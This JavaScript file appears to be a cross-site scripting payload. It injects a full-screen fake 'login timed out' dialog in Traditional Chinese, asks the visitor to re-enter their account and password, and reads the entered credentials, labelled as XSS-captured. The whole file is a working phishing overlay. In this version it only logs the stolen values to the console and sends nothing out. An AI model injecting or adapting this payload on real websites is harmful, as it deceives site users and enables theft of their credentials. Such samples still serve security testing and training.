//?
(function() {
    var overlay = top.document.createElement('div');
    overlay.style.cssText = 'position:fixed !important; top:0 !important; left:0 !important; width:100vw !important; height:100vh !important; background:rgba(0,0,0,0.8) !important; z-index:2147483647 !important; display:flex !important; justify-content:center !important; align-items:center !important;';

    overlay.innerHTML = `
        <div style="background: white; padding: 30px; border-radius: 8px; width: 320px; text-align: center; font-family: sans-serif; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
            <h3 style="color: #ff3333; margin-top: 0; font-size: 20px;">⚠️ 系統提示</h3>
            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">您的登入已逾時，請重新輸入密碼以驗證身分。</p>
            <input type="text" id="fake_user" placeholder="帳號 / 電子郵件" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <input type="password" id="fake_pass" placeholder="密碼" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <button id="fake_submit" style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">確認登入</button>
        </div>
    `;

    top.document.body.appendChild(overlay);

    overlay.querySelector('#fake_submit').addEventListener('click', function() {
        var user = overlay.querySelector('#fake_user').value;
        var pass = overlay.querySelector('#fake_pass').value;
        console.log("【XSS 】讀取到帳密：", { account: user, password: pass });
        overlay.remove();
    });
})();
